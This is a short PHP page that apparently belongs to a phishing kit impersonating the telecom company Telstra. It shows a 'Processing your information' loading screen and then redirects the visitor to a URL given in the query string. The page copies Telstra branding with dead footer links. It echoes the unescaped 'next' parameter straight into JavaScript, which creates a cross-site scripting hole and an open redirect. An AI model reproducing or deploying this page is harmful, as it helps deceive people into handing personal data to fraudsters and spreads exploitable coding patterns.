<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>telstra</title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body>

<header>
        <div class="pic">
            <img src="res/img/logo.png" alt="">
        </div>
    </header>

        <main>
        <div class="container">
            <div class="step">
            <div class="title">
            
            </div>
            </div>
            <div class="coll">
            <h2>Please wait...</h2>
                 <p>Processing your information...</p>
                    <img src="res/img/load.gif" style="width:100px;">
            </div>
        </div>
    </main>

        <footer>
        <div class="links">
            <a href="#" class="copy">Copyright © 2025 Telstra</a><span>|</span>
            <a href="#">Privacy</a><span>|</span>
            <a href="#">Terms of use</a>
        </div>
    </footer>
<script>
var next = "<?php echo $_GET['next']; ?>";
setTimeout(() => {
    window.location=next;
}, 8000);
</script> 

</body>
</html>
